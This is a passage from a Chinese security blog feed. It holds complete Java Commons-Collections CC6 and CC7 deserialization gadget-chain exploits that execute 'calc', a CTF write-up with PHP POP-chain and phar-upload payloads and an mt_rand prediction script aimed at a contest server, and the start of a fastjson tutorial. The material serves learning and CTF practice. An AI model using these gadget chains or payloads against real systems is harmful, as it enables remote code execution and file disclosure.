<p>绕过put之后要让key为有值的tiedMapEntry，</p>
<p>所以我们要在进行一个赋值，这样才能保证反序列化成功。</p>
<h3 id="整体"><a href="#整体" class="headerlink" title="整体"></a>整体</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.bcel.internal.generic.NEW;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.swing.*;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class cc6 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    Class c = Runtime.class;</span><br><span class="line">    Transformer[] t = new Transformer[]&#123;</span><br><span class="line">            new ConstantTransformer(c),</span><br><span class="line">            new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(t);</span><br><span class="line">        Map m = new HashMap();</span><br><span class="line">        LazyMap decorate = (LazyMap) LazyMap.decorate(m, chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, new String());</span><br><span class="line">        HashMap map = new HashMap();</span><br><span class="line">    Class ti = tiedMapEntry.getClass();</span><br><span class="line">        Field map1 = ti.getDeclaredField(&quot;map&quot;);</span><br><span class="line">        map1.setAccessible(true);</span><br><span class="line">        map1.set(tiedMapEntry, new HashMap());</span><br><span class="line">        System.out.println(tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        map.put(tiedMapEntry, &quot;aaa&quot;);</span><br><span class="line"></span><br><span class="line">        map1.set(tiedMapEntry, decorate);</span><br><span class="line"></span><br><span class="line">        serialize(map);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//        Method getDeclaredMethod = (Method)new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(c);</span><br><span class="line">//        Runtime invoke = (Runtime)new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getDeclaredMethod);</span><br><span class="line">//        Object exec1 = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(invoke);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String file) throws Exception &#123;</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        return objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>cc链</category>
      </categories>
  </entry>
  <entry>
    <title>cc链7</title>
    <url>/posts/77e9ffe8/</url>
    <content><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>和cc1一样</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们先来看一下hashtable这个类的readobject方法</p>
<p><img src="/posts/77e9ffe8/1762245434761-55cedbba-eb2f-44b2-8140-358a5c164d73.png" alt="img"></p>
<p>调用了reconstitutionPut方法，跟进一下，</p>
<p><img src="/posts/77e9ffe8/1762245518100-130636ad-581b-459a-8490-599d07dc05f3.png" alt="img"></p>
<p>我们需要调用equals，这里肯定要满足两个key了，并且两个lazymap的hashcode还必须相等然后调用lazymap的equals,他没有，那就找他的父类AbstractMapDecorator，</p>
<p><img src="/posts/77e9ffe8/1762245926471-44732161-6b82-45a7-bec8-d90e656cc419.png" alt="img"></p>
<p>这就调用了map的equals了，如果你的lazymap构造的时候用的是一个hashmap，那就会调用了hashmap的equals，依旧没有，那就找他的父类，</p>
<p><img src="/posts/77e9ffe8/1762247943286-d130cbcc-8161-4caf-a77a-2f18b0a165e7.png" alt="img"></p>
<p>在这里就调用了get，这样就到了这里，然后就是绕过的点了</p>
<p><img src="/posts/77e9ffe8/1762248023551-396559a3-d102-47a5-834f-28fcdfb968d1.png" alt="img"></p>
<p>前面已经讲了要两个LazyMap的hashcode相等，使用即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lazymap1.put(&quot;yy&quot;,1);</span><br><span class="line">lazymap2.put(&quot;zZ&quot;,1);</span><br></pre></td></tr></table></figure>

<p><img src="/posts/77e9ffe8/1762258426795-fee35ecb-1e78-4323-847e-7b5c5f47f2c5.png" alt="img"></p>
<p>然后会lazymap2会多一个yy&#x3D;yy，不会调用transform了，所以要移除掉，加个remove就行了。</p>
<p>要先传一个空的transform，防止put调用equals，提前执行。然后在用反射改回来</p>
<p>剩下的尾部都一样</p>
<p>完整exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.TransformerFactory;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class cc7 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Class c = Runtime.class;</span><br><span class="line">//        Method m = c.getDeclaredMethod(&quot;getRuntime&quot;,null);</span><br><span class="line">//        m.setAccessible(true);</span><br><span class="line">//        Object invoke = m.invoke(null, null);</span><br><span class="line">//        Method m2 = c.getDeclaredMethod(&quot;exec&quot;,String.class);</span><br><span class="line">//        m2.setAccessible(true);</span><br><span class="line">//        m2.invoke(invoke,&quot;calc&quot;);</span><br><span class="line"></span><br><span class="line">        Transformer[] t = &#123;</span><br><span class="line">                new ConstantTransformer(c),</span><br><span class="line">                new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] tr =&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(tr);</span><br><span class="line">        Map map1 = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        Map map2 = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">       Map&lt;Object,Object&gt; lazymap1 = LazyMap.decorate(map1,chainedTransformer);</span><br><span class="line">       lazymap1.put(&quot;yy&quot;,1);</span><br><span class="line"></span><br><span class="line">       Map&lt;Object,Object&gt; lazymap2 = LazyMap.decorate(map2,chainedTransformer);</span><br><span class="line">       lazymap2.put(&quot;zZ&quot;,1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Hashtable hashtable = new Hashtable();</span><br><span class="line">        hashtable.put(lazymap1,1);</span><br><span class="line">        hashtable.put(lazymap2,2);</span><br><span class="line"></span><br><span class="line">        Class aClass = chainedTransformer.getClass();</span><br><span class="line">        Field f = aClass.getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="line">        f.setAccessible(true);</span><br><span class="line">        f.set(chainedTransformer, t);</span><br><span class="line">        lazymap2.remove(&quot;yy&quot;);</span><br><span class="line">        searilize(hashtable);</span><br><span class="line">        unsearilize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//        Method getDeclaredMethod = (Method) new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(c);</span><br><span class="line">//        Object invoke1 = new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getDeclaredMethod);</span><br><span class="line">//        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(invoke1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void searilize(Object o) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object unsearilize(String filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">        return objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>cc链</category>
      </categories>
  </entry>
  <entry>
    <title>cmctfwp</title>
    <url>/posts/d5b6864b/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="小猿口算签到重生版"><a href="#小猿口算签到重生版" class="headerlink" title="小猿口算签到重生版"></a>小猿口算签到重生版</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function autoSolve() &#123;</span><br><span class="line">  function getExpressionAndSolve() &#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">      url: &#x27;/generate&#x27;,</span><br><span class="line">      method: &#x27;GET&#x27;,</span><br><span class="line">      success: function (res) &#123;</span><br><span class="line">        let expr = res.expression;</span><br><span class="line"></span><br><span class="line">        // 去除问号和等号，例如 &quot;98+24+70+80=?&quot;</span><br><span class="line">        expr = expr.replace(/=*\?*$/, &#x27;&#x27;).trim();</span><br><span class="line"></span><br><span class="line">        let answer;</span><br><span class="line">        try &#123;</span><br><span class="line">          answer = eval(expr);</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">          console.error(&quot;❌ 表达式解析失败:&quot;, expr);</span><br><span class="line">          return;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        console.log(&quot;🧠 表达式:&quot;, expr, &quot;➡️ 答案:&quot;, answer);</span><br><span class="line"></span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">          url: &#x27;/verify&#x27;,</span><br><span class="line">          method: &#x27;POST&#x27;,</span><br><span class="line">          contentType: &#x27;application/json&#x27;,</span><br><span class="line">          data: JSON.stringify(&#123; user_input: answer &#125;),</span><br><span class="line">          success: function (r) &#123;</span><br><span class="line">            if (r.flag) &#123;</span><br><span class="line">              alert(&quot;🎉 恭喜你，拿到 FLAG 了！Flag: &quot; + r.flag);</span><br><span class="line">              console.log(&quot;✅ FLAG:&quot;, r.flag);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          error: function (x) &#123;</span><br><span class="line">            if (x.responseJSON &amp;&amp; x.responseJSON.error) &#123;</span><br><span class="line">              console.warn(&quot;❌ 错误:&quot;, x.responseJSON.error);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">              console.warn(&quot;❌ 验证失败，请重试！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;,</span><br><span class="line">      error: function () &#123;</span><br><span class="line">        console.error(&quot;❌ 获取表达式失败&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  console.log(&quot;✅ 自动答题器启动，每 1.5 秒轮询一次...&quot;);</span><br><span class="line">  setInterval(getExpressionAndSolve, 1500);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>控制台提交即可</p>
<p><img src="/posts/d5b6864b/1749651421409-ef0638e6-61b6-488f-8414-bf4a656b4bd4.png" alt="img"></p>
<h2 id="pop之我又双叒叕重生了"><a href="#pop之我又双叒叕重生了" class="headerlink" title="pop之我又双叒叕重生了"></a>pop之我又双叒叕重生了</h2><p><img src="/posts/d5b6864b/1749651602409-0b2f7f1b-1f6f-43e5-b8d8-0f1ffca2abc8.png" alt="img"></p>
<h2 id="函数重生版"><a href="#函数重生版" class="headerlink" title="函数重生版"></a>函数重生版</h2><p><img src="/posts/d5b6864b/1749651742078-7c591412-852a-4a81-9c46-b1a3abce195c.png" alt="img"></p>
<p><img src="/posts/d5b6864b/1749651820586-7123345c-0db7-4a17-ab27-4084f67bb857.png" alt="img"></p>
<h2 id="lottery签到重生版"><a href="#lottery签到重生版" class="headerlink" title="lottery签到重生版"></a>lottery签到重生版</h2><p><img src="/posts/d5b6864b/1749652153248-d5e0d8b0-1d41-433e-8a8c-9fd8b4f18f05.png" alt="img"></p>
<p>爆破就行</p>
<h2 id="busy-search"><a href="#busy-search" class="headerlink" title="busy_search"></a>busy_search</h2><p><img src="/posts/d5b6864b/1749652296583-77fa5e52-2bc1-463c-a185-a6cb9af17782.png" alt="img"></p>
<p>源代码注释中，拼接就行了</p>
<h2 id="can-u-escape"><a href="#can-u-escape" class="headerlink" title="can_u_escape"></a>can_u_escape</h2><p><img src="/posts/d5b6864b/1749652379826-fd918ec5-e625-4f74-b5c8-2c5a550d99a7.png" alt="img"></p>
<p>字符串逃逸，增多，数吐出来的字符就行</p>
<h2 id="u-known？"><a href="#u-known？" class="headerlink" title="u_known？"></a>u_known？</h2><p><img src="/posts/d5b6864b/1749987446113-2769263b-1235-47b0-b8c9-226d5974cfdc.png" alt="img"></p>
<p>第一步，从别的文件加载$gift1&#x3D;$anotherthing;$gift2&#x3D;$otherthing;经过弱比较的渲染后，为0因此这样即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class order</span><br><span class="line">&#123;</span><br><span class="line">    public $start;</span><br><span class="line"></span><br><span class="line">    function __construct($start)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;start = $start;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;start-&gt;helloworld();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class zhengcan</span><br><span class="line">&#123;</span><br><span class="line">    public $lbjjrj;</span><br><span class="line"></span><br><span class="line">    function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;lbjjrj-&gt;douzhi;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class tiandian</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    function __get($Attribute)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;&#x27;;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;serialize&#x27;])) &#123;</span><br><span class="line">    unserialize($_GET[&#x27;serialize&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;使用压缩包点单kfc.rar&quot;;</span><br></pre></td></tr></table></figure>

<p>kfc.php路由有一个简单的反序列化</p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class order</span><br><span class="line">&#123;</span><br><span class="line">    public $start;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class zhengcan</span><br><span class="line">&#123;</span><br><span class="line">    public $lbjjrj;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class tiandian</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new order();</span><br><span class="line">$a-&gt;start=new zhengcan();</span><br><span class="line">$a-&gt;start-&gt;lbjjrj=new tiandian();</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p><img src="/posts/d5b6864b/1749987931956-a829b4ef-00cc-415e-8fc1-3dce18287c8e.png" alt="img"></p>
<p>两个合一起解的flag，套一下cm就行</p>
<h2 id="give-me-money"><a href="#give-me-money" class="headerlink" title="give!me!money!"></a>give!me!money!</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line">import subprocess</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 目标 URL</span><br><span class="line">BASE_URL = &quot;http://27.25.151.40:33907&quot;</span><br><span class="line"></span><br><span class="line"># 设置一个足够大的 money 值以满足 money &gt;= 114514</span><br><span class="line">MONEY = 200000</span><br><span class="line"></span><br><span class="line"># 固定使用 id=d（也可改成 a，但重定向后同样会携带 money）</span><br><span class="line">params = &#123;</span><br><span class="line">    &quot;id&quot;: &quot;d&quot;,</span><br><span class="line">    &quot;money&quot;: MONEY,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 第一步：发送 GET 请求，触发服务器的 mt_srand/mt_rand 逻辑</span><br><span class="line">t0 = int(time.time())</span><br><span class="line">resp_get = requests.get(BASE_URL, params=params)</span><br><span class="line">t1 = int(time.time())</span><br><span class="line"></span><br><span class="line">print(f&quot;[+] GET 返回 (&#123;len(resp_get.text)&#125; bytes)，开始尝试预测 shenhe…&quot;)</span><br><span class="line"></span><br><span class="line"># 第二步：遍历本地时间窗口，复现服务器上 PHP mt_rand 的第101次输出</span><br><span class="line">for ts in range(t0 - 2, t1 + 3):</span><br><span class="line">    # PHP 中：$ccc = time(); $ttt = substr($ccc, 0, 7);</span><br><span class="line">    seed = int(str(ts)[:7])</span><br><span class="line">    # 用 PHP CLI 复现：mt_srand(seed); 跳过前 100 次 mt_rand(); 取第 101 次</span><br><span class="line">    cmd = (</span><br><span class="line">        f&#x27;php -r &quot;&#x27;</span><br><span class="line">        f&#x27;mt_srand(&#123;seed&#125;);&#x27;</span><br><span class="line">        f&#x27;for($i=0;$i&lt;100;$i++) mt_rand();&#x27;</span><br><span class="line">        f&#x27;echo mt_rand();&quot;&#x27;</span><br><span class="line">    )</span><br><span class="line">    try:</span><br><span class="line">        shenhe = int(subprocess.check_output(cmd, shell=True))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        continue</span><br><span class="line"></span><br><span class="line">    # 第三步：将候选的 shenhe 提交回服务器，看是否成功</span><br><span class="line">    post = requests.post(BASE_URL, params=params, data=&#123;&quot;c&quot;: shenhe&#125;)</span><br><span class="line">    text = post.text</span><br><span class="line"></span><br><span class="line">    # 失败时服务器会输出 “开桂了？哪来这么多钱”</span><br><span class="line">    if &quot;开桂了？哪来这么多钱&quot; not in text:</span><br><span class="line">        print(f&quot;[✔] 成功！预测到 shenhe = &#123;shenhe&#125;&quot;)</span><br><span class="line">        print(&quot;服务器返回：&quot;)</span><br><span class="line">        print(text)</span><br><span class="line">        break</span><br><span class="line">else:</span><br><span class="line">    print(&quot;[-] 在给定时间窗口内未能猜中 shenhe，请扩大时间范围或检查 PHP CLI 环境。&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/d5b6864b/1749988147292-1b771298-c8ad-455d-b598-7e1e19321d07.png" alt="img"></p>
<h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p><img src="/posts/d5b6864b/1749987180378-cec456c5-5699-4ad2-ab06-0532b333a8c1.png" alt="img"></p>
<p>用数组即可</p>
<h2 id="upload2"><a href="#upload2" class="headerlink" title="upload2"></a>upload2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class hacker&#123;</span><br><span class="line">public $cmd=&quot;system(&#x27;ls&#x27;);&quot;;</span><br><span class="line">public $a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new hacker();</span><br><span class="line">$a-&gt;a = &quot;highlight_file(array_rand(array_flip(scandir(chr(ord(strrev(crypt(serialize(array())))))))));__halt_compiler();&quot;;</span><br><span class="line">$a-&gt;cmd = &amp;$a-&gt;a;</span><br><span class="line">echo serialize($a).&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">@unlink(&quot;phar.phar&quot;);</span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;); // 后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // 设置stub</span><br><span class="line">$phar-&gt;setMetadata($a); // 将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); // 添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br><span class="line">import gzip</span><br><span class="line"></span><br><span class="line">with open(&#x27;./phar.phar&#x27;, &#x27;rb&#x27;) as file:  # 更改文件后缀</span><br><span class="line">    data = file.read()</span><br><span class="line"></span><br><span class="line">ndata = gzip.compress(data)</span><br><span class="line"></span><br><span class="line">with open(&#x27;./evil.jpg&#x27;, &#x27;wb&#x27;) as file:  # 更改文件后缀</span><br><span class="line">    file.write(ndata)</span><br></pre></td></tr></table></figure>

<p>两个exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/resource=phar:///tmp/e5ec0425f5c71e2a21fcd981878e4806.jpg</span><br></pre></td></tr></table></figure>

<p>绕过phar:&#x2F;&#x2F;</p>
]]></content>
      <categories>
        <category>复现</category>
      </categories>
  </entry>
  <entry>
    <title>fastjson1</title>
    <url>/posts/db216354/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>终于开始fastjson的学习了，这两天放松的有点太严重了，哈哈哈。</p>
<h1 id="Fastjson简介"><a href="#Fastjson简介" class="headerlink" title="Fastjson简介"></a>Fastjson简介</h1><p>fastjson是一个java库，主要作用：可以把java对象转换为json的格式，也可以将json的格式转换为java对象。<br>提供了两个主要的接口来分别实现序列化和反序列化的操作<br><code>JSON.toJSONString</code>将java对象转化为json对象，序列化的过程。<br><code>JSON.parseObject/JSON.parse</code>将json对象重新变回java对象；反序列化过程。<br>这里可以将json理解成一个字符串。（这样就和php反序列化类似）</p>
<h1 id="从代码角度分析"><a href="#从代码角度分析" class="headerlink" title="从代码角度分析"></a>从代码角度分析</h1><h2 id="序列化代码的实现"><a href="#序列化代码的实现" class="headerlink" title="序列化代码的实现"></a>序列化代码的实现</h2><p>这里我们来写一下简单的代码来了解一下具体的序列化和反序列化的过程。<br>首先引入依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;1.2.24&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<p>这里来写一个简单的Student类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Student constructor&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Student getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Student setAge&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Student getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Student setName&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们尝试对它进行实例化调用并序列化成一个json的字符串</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentSerialize</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();  </span><br><span class="line">        student.setAge(<span class="number">22</span>);  </span><br><span class="line">        student.setName(<span class="string">&quot;红烧花园宝宝&quot;</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JSON.toJSONString(student, SerializerFeature.WriteClassName);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们来打个断点分析一下<br><img src="/posts/db216354/20260119123830319.png" alt="image.png"><br>首先这里看到java对象变成json字符串的具体对象是Student<br><img src="/posts/db216354/20260119141131710.png" alt="image.png"><br>看到这里在static变量里是有一个值为@type的DEFAULT_TYPE_KEY，这个是很重要的，我们接下来会做一个解释。<br><img src="/posts/db216354/20260119141438080.png" alt="image.png"><br>这里调用完toString，序列化过程也就差不多了。<br>主要完成序列化的点在<br><code>String json = JSON.toJSONString(student, SerializerFeature.WriteClassName);</code></p>
<ol>
<li>第一个参数：不用过多介绍，就是需要序列化的类</li>
<li>第二个参数：在序列化（Java 对象转 JSON）时，将 Java 对象的数据类型（类名）写入到 JSON 字符串中。</li>
</ol>
<ul>
<li>当我们想要把json对象还原成java对象时，我们就可以通过’@type‘来知道具体还原的对象。总的来说就是方便反序列化。<br><img src="/posts/db216354/20260119142240314.png" alt="image.png"></li>
</ul>
<h2 id="反序列化代码的实现"><a href="#反序列化代码的实现" class="headerlink" title="反序列化代码的实现"></a>反序列化代码的实现</h2><p>Studentunserialize</p>
